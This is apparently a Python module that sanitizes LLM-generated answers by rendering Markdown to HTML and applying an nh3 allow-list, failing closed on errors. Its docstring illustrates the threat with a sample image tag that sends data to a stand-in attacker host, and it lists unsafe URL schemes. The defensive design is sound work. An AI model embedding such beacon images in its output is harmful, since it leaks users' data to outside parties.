"""
Rendering boundary for LLM-generated answers.

Pipeline: Markdown (markdown-it-py) -> HTML -> nh3 allow-list sanitize.

The threat model here is specifically auto-fetching content embedded in
the answer -- `<img src="https://attacker.com/?data=...">` or a
markdown image doing the same thing -- plus script/handler injection
and unsafe URL schemes (javascript:, data:, vbscript:). Rendering
markdown to HTML *before* sanitizing (rather than only regexing the
markdown source) means any HTML the model smuggled in through the
markdown pipe is also caught by the same allow-list, instead of relying
on two separate, divergent filters.

Fail-closed: if rendering or sanitization itself raises, callers get
`None` back (see `sanitize_output`) rather than the original,
unsanitized text -- an exception here must never result in unsafe
content passing through untouched.
"""

from __future__ import annotations

try:
    import nh3
except ImportError:  # pragma: no cover
    nh3 = None

try:
    from markdown_it import MarkdownIt
    _md = MarkdownIt("commonmark")
except ImportError:  # pragma: no cover
    _md = None

# Only these tags survive sanitization. Deliberately excludes:
#  - img (auto-fetch / beacon risk)
#  - script, style, iframe, object, embed, form (active content)
#  - svg, math (can carry active content / hidden fetches)
ALLOWED_TAGS = {
    "p", "br", "b", "strong", "em", "i", "u", "s",
    "code", "pre", "blockquote",
    "ul", "ol", "li",
    "h1", "h2", "h3", "h4", "h5", "h6",
    "table", "thead", "tbody", "tr", "th", "td",
    "a",
}

ALLOWED_ATTRIBUTES = {
    "a": {"href", "title"},
}

# Only these URL schemes are honored anywhere (href, etc). javascript:,
# data:, vbscript:, file: and bare/unknown schemes are all stripped.
ALLOWED_URL_SCHEMES = {"http", "https", "mailto"}


def render_markdown(text: str) -> str:
    """
    Render Markdown to HTML. Falls back to treating the input as plain
    text (HTML-escaped by the sanitizer step regardless) if
    markdown-it-py is unavailable.
    """
    if _md is None:
        return text
    return _md.render(text)


def sanitize_html(html: str) -> str:
    """
    Allow-list sanitize HTML. Strips img entirely (no auto-loading
    images), strips script/style/event-handler content, and restricts
    link/URLs to safe schemes only.
    """
    if nh3 is None:
        # Without nh3 we cannot safely guarantee HTML is neutralized;
        # fail closed by stripping all tags rather than passing raw
        # HTML through.
        return _strip_all_tags(html)

    return nh3.clean(
        html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        url_schemes=ALLOWED_URL_SCHEMES,
        link_rel="noopener noreferrer nofollow",
        strip_comments=True,
    )


def _strip_all_tags(html: str) -> str:
    import re
    return re.sub(r"<[^>]*>", "", html)


def sanitize_output(text: str) -> str | None:
    """
    Final Stage 3 rendering boundary: Markdown -> HTML -> allow-list
    sanitize.

    Returns the sanitized string on success. On ANY unexpected error in
    rendering or sanitization, returns None (fail closed) instead of
    the original text, so a crash here can never leak unsanitized
    content -- callers must treat None as "block/escalate", not as
    "no changes needed".
    """
    try:
        html = render_markdown(text)
        cleaned = sanitize_html(html)
        return cleaned.strip()
    except Exception:
        return None
